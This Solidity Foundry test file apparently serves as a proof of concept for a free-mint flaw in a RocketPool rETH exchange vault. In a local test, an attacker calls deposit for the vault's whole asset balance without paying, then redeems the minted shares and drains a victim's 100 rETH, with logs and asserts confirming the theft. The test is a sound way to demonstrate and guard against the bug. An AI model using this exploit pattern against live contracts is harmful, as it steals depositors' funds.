// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {console2} from "forge-std/console2.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IERC4626} from "@crane/contracts/interfaces/IERC4626.sol";
import {TestBase_RocketPoolRETHStandardExchange} from "contracts/test/bases/TestBase_RocketPoolRETHStandardExchange.sol";

contract RocketPoolCraneFreeMint_Test is TestBase_RocketPoolRETHStandardExchange {
    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");

    function test_freeMint_drain() public {
        IERC20 A = IERC20(address(hermeticReth));
        uint256 victimIn = 100 ether;
        _mintReth(victim, victimIn);
        vm.startPrank(victim);
        A.approve(seVault, victimIn);(uint256 vShares,) = seIn.exchangeIn(A, victimIn, IERC20(seVault), 0, victim, false, block.timestamp + 1 hours);
        vm.stopPrank();(uint256 vBefore,) = seIn.previewExchangeIn(IERC20(seVault), vShares, A);
        console2.log("victim shares", vShares);
        console2.log("victim redeem value before", vBefore);
        console2.log("ERC4626 totalAssets", IERC4626(seVault).totalAssets());

        uint256 W = A.balanceOf(seVault);
        console2.log("vault asset balance W", W);
        uint256 b0 = A.balanceOf(attacker);
        vm.startPrank(attacker);
        uint256 minted = IERC4626(seVault).deposit(W, attacker);
        console2.log("attacker shares minted, 0 transferred", minted);seIn.exchangeIn(IERC20(seVault), minted, A, 0, attacker, false, block.timestamp + 1 hours);
        vm.stopPrank();
        uint256 profit = A.balanceOf(attacker) - b0;(uint256 vAfter,) = seIn.previewExchangeIn(IERC20(seVault), vShares, A);
        console2.log("attacker profit (cost 0)", profit);
        console2.log("victim redeem value after", vAfter);
        assertGt(profit, 99 ether);
        assertLt(vAfter, 1 ether);
    }
}
